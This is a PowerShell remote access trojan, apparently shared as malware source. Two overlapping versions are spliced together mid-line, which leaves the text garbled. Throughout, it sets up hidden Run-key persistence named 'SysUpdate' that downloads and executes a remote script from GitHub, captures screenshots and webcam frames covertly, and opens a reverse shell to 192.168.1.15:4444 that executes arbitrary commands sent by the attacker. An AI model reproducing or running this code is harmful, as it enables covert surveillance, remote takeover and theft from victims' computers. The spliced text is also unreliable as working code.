# 1. Persistence Setup
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SysUpdate"
$githubUrl = "https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1"

if (-not (Get-ItemProperty $regPath -Name $regName -ErrorAction SilentlyContinue)) {
    Set-ItemProperty -Path $regPath# 1. Fixed Registry Persistence (Checking for the specific property)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SysUpdate"
$githubUrl = "https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1"

$currentReg = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
if ($null -eq $currentReg.$regName) {
    Set-ItemProperty -Path $regPath -Name $regName -Value "powershell -w hidden -nop -c IEX((New-Object Net.WebClient).DownloadString('$githubUrl'))"
}

# 2. Fixed Assembly Loading (Separated Logic)
Add-Type -AssemblyName System.Drawing, System.Windows.Forms
# WinRT requires specialized loading in PowerShell
[void][Window.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType=WindowsRuntime]

# 3. Screenshot Function
function Get-Screenshot {
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
    $graphics.Dispose()
    $ms = New-Object IO.MemoryStream
    $bitmap.Save($ms, [Drawing.Imaging.ImageFormat]::Jpeg)
    $bytes = $ms.ToArray()
    $ms.Close()
    $bitmap.Dispose()
    return [Convert]::ToBase64String($bytes)
}

# 4. Webcam Function (Fixed WinRT Task Handling)
function Get-WebcamFrame {
    try {
        $mc = New-Object Windows.Media.Capture.MediaCapture
        # We MUST use .GetAwaiter().GetResult() for WinRT Tasks in PS
        $mc.InitializeAsync().GetAwaiter().GetResult()
        
        $encoding = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
        $lowLag = $mc.PrepareLowLagPhotoCaptureAsync($encoding).GetAwaiter().GetResult()
        $photo = $lowLag.CaptureAsync().GetAwaiter().GetResult()
        
        $stream = $photo.Frame.AsStreamForRead()
        $ms = New-Object System.IO.MemoryStream
        $stream.CopyTo($ms)
        
        $bytes = $ms.ToArray()
        $ms.Dispose(); $stream.Dispose(); $mc.Dispose()
        return [Convert]::ToBase64String($bytes)
    } catch {
        return "Webcam Error: $($_.Exception.Message)"
    }
}

# 5. The Unified Loop (Fixes Logic Errors 1, 2, and 3)
$client = New-Object System.Net.Sockets.TCPClient('192.168.1.15', 4444)
$stream = $client.GetStream()
$buffer = New-Object byte[] 65536
$encoding = [System.Text.Encoding]::ASCII

while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    # Get the RAW command string from the attacker
    $rawInput = $encoding.GetString($buffer, 0, $i).Trim()
    if ([string]::IsNullOrWhiteSpace($rawInput)) { continue }

    # SWITCH on the command string, NOT the output of IEX
    $result = switch -Regex ($rawInput) {
        '^screenshot$' { Get-Screenshot }
        '^webcam$'     { Get-WebcamFrame }
        '^exit$'       { $client.Close(); return }
        default        { iex $rawInput 2>&1 | Out-String }
    }

    # Wrap up and send back
    $response = $result + "`nPS " + (Get-Location).Path + "> "
    $sendByte = $encoding.GetBytes($response)
    $stream.Write($sendByte, 0, $sendByte.Length)
    $stream.Flush()
}
$client.Close() -Name $regName -Value "powershell -w hidden -nop -c IEX((New-Object Net.WebClient).DownloadString('$githubUrl'))"
}

# 2. Load Assemblies
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms

# 3. Screenshot Function
function Get-Screenshot {
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
    $graphics.Dispose()
    $ms = New-Object IO.MemoryStream
    $bitmap.Save($ms, [Drawing.Imaging.ImageFormat]::Jpeg)
    $bytes = $ms.ToArray()
    $ms.Close()
    $bitmap.Dispose()
    return [Convert]::ToBase64String($bytes)
}

# 4. Webcam Function (Fixed Async Syntax)
function Get-WebcamFrame {
    try {
        # Note: WinRT classes often require full namespace acceleration in PS
        $mediaCapture = New-Object Windows.Media.Capture.MediaCapture
        $mediaCapture.InitializeAsync().GetAwaiter().GetResult()
        
        $lowLag = $mediaCapture.PrepareLowLagPhotoCaptureAsync([Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()).GetAwaiter().GetResult()
        $capturedPhoto = $lowLag.CaptureAsync().GetAwaiter().GetResult()
        
        $stream = $capturedPhoto.Frame.AsStreamForRead()
        $memoryStream = New-Object System.IO.MemoryStream
        $stream.CopyTo($memoryStream)
        
        $bytes = $memoryStream.ToArray()
        $memoryStream.Close()
        $stream.Close()
        $mediaCapture.Dispose()
        
        return [Convert]::ToBase64String($bytes)
    } catch {
        return "Webcam failed: $($_.Exception.Message)"
    }
}

# 5. Main Unified Network Loop
$client = New-Object System.Net.Sockets.TCPClient('192.168.1.15', 4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$buffer = New-Object byte[] 65536

# Initial Prompt
$writer.Write("PS " + (Get-Location).Path + "> ")
$writer.Flush()

while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $i).Trim()
    
    if ($data.Length -gt 0) {
        # Handle custom commands vs system commands
        $output = switch -Regex ($data) {
            '^screenshot$' { Get-Screenshot }
            '^webcam$'     { Get-WebcamFrame }
            '^exit$'       { $client.Close(); break }
            default        { iex $data 2>&1 | Out-String }
        }
        
        # Send result + new prompt
        $sendback = $output + "`nPS " + (Get-Location).Path + "> "
        $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }
}
$client.Close()
